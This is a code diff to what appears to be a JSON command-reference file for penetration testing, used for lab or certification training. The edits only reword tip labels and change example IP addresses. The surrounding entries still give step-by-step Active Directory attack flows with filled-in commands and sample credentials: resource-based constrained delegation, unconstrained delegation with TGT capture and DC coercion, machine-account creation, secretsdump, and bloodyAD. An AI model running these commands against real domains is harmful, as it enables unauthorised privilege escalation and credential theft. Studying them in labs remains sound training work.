@@ -69,7 +69,7 @@
       "troubleshooting": {
         "Access denied": "User lacks GenericWrite/WriteDacl on target computer"
       },
-      "notes": "RBCD (RESOURCE-BASED CONSTRAINED DELEGATION):\nAllows impersonation to specific services on target computer.\n\nATTACK FLOW:\n1. Find target where you have GenericWrite/WriteDacl (BloodHound)\n2. Create/use machine account you control (requires MAQ > 0 or existing)\n3. Set RBCD: rbcd.py -delegate-from YOURPC$ -delegate-to TARGET$\n4. Get ticket: getST.py -spn cifs/TARGET -impersonate administrator\n5. Use ticket: psexec.py -k TARGET\n\nREQUIRES:\n- GenericWrite/WriteDacl/GenericAll on target computer\n- A machine account you control (create with addcomputer.py)\n- Target computer must have unconstrained delegation OR you use S4U2Self\n\ncertification TIP:\nRBCD is extremely common in certification labs. Look for GenericWrite on computers.",
+      "notes": "RBCD (RESOURCE-BASED CONSTRAINED DELEGATION):\nAllows impersonation to specific services on target computer.\n\nATTACK FLOW:\n1. Find target where you have GenericWrite/WriteDacl (BloodHound)\n2. Create/use machine account you control (requires MAQ > 0 or existing)\n3. Set RBCD: rbcd.py -delegate-from YOURPC$ -delegate-to TARGET$\n4. Get ticket: getST.py -spn cifs/TARGET -impersonate administrator\n5. Use ticket: psexec.py -k TARGET\n\nREQUIRES:\n- GenericWrite/WriteDacl/GenericAll on target computer\n- A machine account you control (create with addcomputer.py)\n- Target computer must have unconstrained delegation OR you use S4U2Self\n\nPRACTICAL TIP:\nRBCD is extremely common in labs. Look for GenericWrite on computers.",
       "filled_example": "python3 rbcd.py -delegate-from 'YOURPC$' -delegate-to 'DC01$' -action write 'corp.local/user:P@ssw0rd123!'"
     },
     {
@@ -333,7 +333,7 @@
       "troubleshooting": {
         "Access denied": "Need admin rights on unconstrained delegation host"
       },
-      "notes": "UNCONSTRAINED DELEGATION ATTACK:\nHosts with TrustedForDelegation cache TGTs of connecting users.\n\nATTACK FLOW:\n1. Compromise host with unconstrained delegation\n2. Run Rubeus monitor to watch for TGTs\n3. Coerce high-value target (DC) to authenticate to us\n4. Capture TGT and use for impersonation\n\nCOERCION METHODS:\nPetitPotam, PrinterBug, Coercer - force DC to authenticate.\n\ncertification TIP:\nLook for 'YOURPC' \u2192 'TrustedForDelegation: True' in BloodHound.",
+      "notes": "UNCONSTRAINED DELEGATION ATTACK:\nHosts with TrustedForDelegation cache TGTs of connecting users.\n\nATTACK FLOW:\n1. Compromise host with unconstrained delegation\n2. Run Rubeus monitor to watch for TGTs\n3. Coerce high-value target (DC) to authenticate to us\n4. Capture TGT and use for impersonation\n\nCOERCION METHODS:\nPetitPotam, PrinterBug, Coercer - force DC to authenticate.\n\nPRACTICAL TIP:\nLook for 'YOURPC' \u2192 'TrustedForDelegation: True' in BloodHound.",
       "filled_example": "Rubeus.exe monitor /interval:5 /nowrap /targetuser:DC01$"
     },
     {
@@ -359,7 +359,7 @@
         {
           "name": "<DC_IP>",
           "description": "Domain controller IP",
-          "example": "192.168.50.70",
+          "example": "10.10.10.70",
           "required": true
         },
         {
@@ -403,7 +403,7 @@
         "Access denied": "User cannot create machine accounts"
       },
       "notes": "MACHINE ACCOUNT CREATION:\nBy default, domain users can create up to 10 machine accounts (ms-DS-MachineAccountQuota).\n\nFOR RBCD:\n1. Create machine account you control\n2. Use its hash for S4U attack\n\nGET HASH:\nimpacket-secretsdump '<DOMAIN>/<NEW_COMPUTER>$:<PASSWORD>@<DC_IP>'\n\nOR compute hash:\npython3 -c \"import hashlib; print(hashlib.new('md4', 'Password123!'.encode('utf-16le')).hexdigest())\"",
-      "filled_example": "impacket-addcomputer -computer-name 'YOURPC$' -computer-pass 'Password123!' -dc-ip 192.168.50.70 'corp.local/user:Password123!'"
+      "filled_example": "impacket-addcomputer -computer-name 'YOURPC$' -computer-pass 'Password123!' -dc-ip 10.10.10.70 'corp.local/user:Password123!'"
     },
     {
       "id": "bloodyad-rbcd",
@@ -433,7 +433,7 @@
         {
           "name": "<DC_IP>",
           "description": "Domain controller IP",
-          "example": "192.168.50.70",
+          "example": "10.10.10.70",
           "required": true
         },
         {
@@ -480,7 +480,7 @@
         "Access denied": "Insufficient permissions on target"
       },
       "notes": "BLOODYAD:\nMulti-purpose AD exploitation tool.\n\nAlternative to rbcd.py for RBCD configuration.",
-      "filled_example": "bloodyAD -d 'corp.local' -u 'user' -p 'P@ssw0rd123!' --host '192.168.50.70' set object 'DC01$' msDS-AllowedToActOnBehalfOfOtherIdentity -v 'S-1-5-21-...'"
+      "filled_example": "bloodyAD -d 'corp.local' -u 'user' -p 'P@ssw0rd123!' --host '10.10.10.70' set object 'DC01$' msDS-AllowedToActOnBehalfOfOtherIdentity -v 'S-1-5-21-...'"
     },
     {
       "id": "rubeus-tgtdeleg",
